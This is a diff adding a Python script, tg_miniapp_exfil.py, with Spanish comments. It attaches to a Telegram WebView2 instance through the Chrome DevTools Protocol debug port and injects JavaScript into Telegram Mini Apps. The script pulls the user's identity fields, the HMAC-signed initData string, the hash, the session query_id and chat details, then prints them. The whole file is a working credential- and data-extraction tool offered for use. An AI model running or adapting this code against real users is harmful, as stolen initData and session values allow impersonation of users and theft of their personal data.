@@ -1,0 +1,80 @@
+"""
+tg_miniapp_exfil.py -- Extraccion de datos de Mini Apps via CDP
+Conecta al WebSocket de un target Telegram WebView2 y extrae
+los datos del bridge window.Telegram.WebApp.
+"""
+import websocket
+import json
+import requests
+
+def get_telegram_targets(cdp_port=9222):
+    """Obtener targets de Mini Apps de Telegram."""
+    resp = requests.get(f"http://127.0.0.1:{cdp_port}/json")
+    targets = resp.json()
+    # Filtrar targets de Telegram (Mini Apps)
+    tg_targets = [
+        t for t in targets
+        if "telegram" in t.get("url", "").lower()
+        or "tgWebAppData" in t.get("url", "")
+    ]
+    return tg_targets
+
+def extract_webapp_data(ws_url):
+    """Extraer datos del bridge Telegram.WebApp via CDP."""
+    ws = websocket.create_connection(ws_url)
+    
+    # Ejecutar JavaScript para extraer datos del bridge
+    js_code = """
+    (function() {
+        var wa = window.Telegram && window.Telegram.WebApp;
+        if (!wa) return JSON.stringify({error: "Bridge no disponible"});
+        return JSON.stringify({
+            // Datos de identidad del usuario
+            user_id: wa.initDataUnsafe.user?.id,
+            first_name: wa.initDataUnsafe.user?.first_name,
+            username: wa.initDataUnsafe.user?.username,
+            language: wa.initDataUnsafe.user?.language_code,
+            is_premium: wa.initDataUnsafe.user?.is_premium,
+            photo_url: wa.initDataUnsafe.user?.photo_url,
+            // Datos de sesion
+            query_id: wa.initDataUnsafe.query_id,
+            auth_date: wa.initDataUnsafe.auth_date,
+            hash: wa.initDataUnsafe.hash,
+            // initData completo (cadena firmada HMAC)
+            initData: wa.initData,
+            // Contexto del chat
+            chat_type: wa.initDataUnsafe.chat_type,
+            chat_instance: wa.initDataUnsafe.chat_instance,
+            // Metadatos de la plataforma
+            platform: wa.platform,
+            version: wa.version,
+            theme: wa.themeParams
+        });
+    })();
+    """
+    
+    cmd = json.dumps({
+        "id": 1,
+        "method": "Runtime.evaluate",
+        "params": {"expression": js_code, "returnByValue": True}
+    })
+    ws.send(cmd)
+    result = json.loads(ws.recv())
+    
+    data = json.loads(
+        result["result"]["result"]["value"]
+    )
+    
+    print("[+] Datos extraidos del bridge Telegram.WebApp:")
+    for key, value in data.items():
+        if value:
+            truncated = str(value)[:80]
+            print(f"    {key}: {truncated}")
+    
+    ws.close()
+    return data
+
+# Uso:
+# targets = get_telegram_targets()
+# for t in targets:
+#     data = extract_webapp_data(t["webSocketDebuggerUrl"])
